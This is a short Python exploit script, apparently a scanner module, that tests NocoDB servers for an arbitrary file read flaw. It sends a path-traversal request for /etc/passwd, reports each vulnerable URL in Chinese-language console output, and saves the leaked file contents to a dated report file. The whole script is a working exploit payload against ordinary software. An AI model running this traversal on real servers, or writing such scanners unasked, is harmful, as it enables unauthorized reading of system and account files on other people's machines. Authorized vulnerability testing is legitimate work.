import requests
import time
import buter
import wirtefile

filename = "./reps/NocoDB任意文件读取-"+str(time.strftime("%Y-%m-%d", time.localtime()))
poc = "/download/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
}

def nocodballfileread(url):
    try:
        reps = requests.get(url=url+poc, headers=headers, verify=False, timeout=5)
        if reps.status_code == 200 and 'nologin' in reps.text:
            print(buter.colors.GREEN+  f"存在NocoDB任意文件读取 url : {url}" + buter.colors.END)
            reptext = reps.url +"\n" + reps.text
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现NocoDB任意文件读取 url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
